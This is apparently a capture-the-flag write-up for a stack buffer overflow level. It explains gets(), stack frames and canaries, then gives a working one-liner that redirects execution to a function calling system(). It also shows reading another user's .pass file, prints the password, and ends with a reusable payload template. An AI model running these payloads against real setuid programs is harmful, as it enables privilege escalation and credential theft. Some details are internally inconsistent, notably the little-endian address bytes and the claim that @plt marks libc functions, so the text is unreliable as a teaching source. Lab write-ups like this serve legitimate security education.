# level1

Meet **buffer overflows**!

We do the usual suspects, as always : "checksec", "ll", "readelf"...
Nothing out of the ordinary.

Let's try a few inputs :

The program with no args gives us a prompt, if we type a basic string or serie of strings, it just closes and returns `32`.
If we try a long enough string, this results in a SEGFAULT.

>./level1

> foo
> foobar
> This is a very long string written manually by acroue. Did you know that in ancient rome, cement was made using volcanic ash. This created ash 'lumps' in the cement. Scientists theorize that this is the reason so many of their builds remain today. When cracks formed inside, water could enter those and 'heal' those cracks. Facinating is it not? I suggest you go read the cement wikipedia page. It is quite captivating!

Let's analyse our binary then.

This command
> gdb : info function
gives us a few functions :
- main (obviously).
- run.
- frame_dummy.
- fwrite@plt, which is from the LIBC.
- system@plt, also from the LIBC.
- gets@plt, also also from the LIBC.

@plt indicates that a function comes from the libc.

Let's see what these LIBC functions do :
*fwrite* writes to a fd
*gets* reads from stdin into a buffer. See the man
```
BUGS
       Never  use gets().  Because it is impossible to tell without knowing the
       data in advance how many characters gets() will read, and because gets()
       will continue to store characters past the end of the buffer, it is  ex‐
       tremely  dangerous to use.  It has been used to break computer security.
       Use fgets() instead.
```

*system* executes a command passed as argument. See the man
```
Caveats
       Do not use system() from a privileged program  (a  set-user-ID  or  set-
       group-ID program, or a program with capabilities) because strange values
       for  some  environment  variables  might  be  used to subvert system in‐
       tegrity.  For example, PATH could be manipulated so  that  an  arbitrary
       program is executed with privilege. [...]
```

For the user functions, Frame_dummy is just code that is never called. Run calls to *system*, we will try to access run and see from here.

## What is a buffer overflow

To access the run command we will need to do a **buffer overflow** attack. But what is it?

Basically when memory is statically allocated on the stack you have a set size you can use, but in the case of *gets* we can see that it breaks through the allocated size without checking due to it's lack of verification. Most of the time a **canary** is used to prevent these overflows from creating undefined behavior but our earlier `checksec` showed that there is no **canary**.

A canary is a way to check for **buffer overflows**, how it works is the program sets a variable before and after the program and if it is changed (like in an overflow), it throws an error. It is named after canaries that miners used to detect gas leaks or the presence of carbon monoxyde since canaries have smaller lungs and thus have a lesser tolerence to these gasses than humans.

That's nice and all but how do we use this to our advantage?
Patience mon ami, we will get there.

So to understand this next step we first need to understand stack memory and how function behave.
A function uses (roughly )two registers EBP (Base Pointer) and ESP (Stack Pointer).

**Base pointer** is the beginning of the function memory range and **Stack pointer** is the end of the range.

Example :
```
Func A {

foo
bar
barfoo
CALL Func B
zoo
zar
...
}
```

The call to **Func B** stores the adress of **zoo**, the instruction to go back to when **B** is done on the stack. Then **B** stores the previous *EBP* on the stack and sets it's own memory range with *EBP* and *ESP*.

So after entering **B** our stack looks like this :

```
[Stack frame A]
-- zoo adress --
--- A's ebp ---
[Stack frame B]
```
Now if we do a **buffer overflow** we will end up overwriting *B's stack frame*, *A's ebp* and **zoo's adress**.
Thus by playing our cards right, if we wrote another adress instead of zoo, when **B** tries to return to **A** it will instead go to the adress we put there instead.

## Back to the Attack

Now our goal will be to overwrite the return adress of the `gets` function with the adress of `run`

How can we locate the return adress compared to our buffer?
We could do a dichotomic search in order to find the number of characters needed to overwrite the return adress and cause a segfault.

We write a set number of characters and see if it segfaults, if it does we reduce the number, if it does not we increase it until we find the exact number.
Let's start with 10 characters `0123456789`. This does nothing, let's double it 20 chars:`01234567890123456789`. Still nothing, now double it again 40 chars:`0123456789012345678901234567890123456789`.
It seems we have to double it again 80 chars:`01234567890123456789012345678901234567890123456789012345678901234567890123456789`. This finally gives us a segfault.

So our return adress is located at *n* chars from the start of our buffer where `40 < n < 80`. Let's pick the middle now (and speed up this step).

`012345678901234567890123456789012345678901234567890123456789` : 60 chars. No segfault so `60 < n < 80`
`0123456789012345678901234567890123456789012345678901234567890123456789` : 70 chars. No segfault so `70 < n < 80`
`0123456789012345678901234567890123456789012345678901234567890123456789abcde` : 75 chars. No segfault so `75 < n < 80`
`0123456789012345678901234567890123456789012345678901234567890123456789abcdefg` : 77 chars. Segfault so `75 < n < 77` so `n == 76`
Thus `0123456789012345678901234567890123456789012345678901234567890123456789abcdef` (76 chars) gives as an **Illegal instruction (core dumped)**. So our offset is at 76 chars.

We did this by hand once. It was a pain, now we will use this [buffer overflow pattern generator](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?). It creates a pattern and when we write it inside gdb, it will return a segfault at a specific adress. This adress will match a piece of our pattern. If our pattern was `AaBbCcDdEe` and the segfault adress was `cD`, it would be an offset of **5**.

Now we need to find the adress of the `run` to "return" to it instead of `gets`' caller (in our case, main).

We use
> gdb : info function`
again and see that `run`'s adress is **0x08048444**, this will be our payload. Let's build our attack. We need an [offset] and a [payload]. Our payload needs to be written in little endian since we are writing it backwards (i think). So `0x08048444` becomes `0x44840808`. Since we want to write an adress and not just characters, we need to write it as hexadecimal values, so it becomes `\x44\x84\x08\x08`.

We will inject our [offset][payload] combo using python with the following command :

```python
(cat <(python -c 'print "0123456789012345678901234567890123456789012345678901234567890123456789abcdef" + "\x44\x84\x04\x08"') -) | ./level1
```
> Good... Wait what?

Let's see if we did escalated our privileges.
> whoami
> level2

Now we can get the password using
```sh
cat /home/user/level2/level2/.pass
```
>53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

We can now switch to level2, yipeee!
```sh
su level2
```

From now on we will only be using the pattern generator and a variation of the following command :
```python
(cat <(python -c 'print "A"*N + "[payload]"') -) | ./levelX
```
It will be easier to follow for everyone.
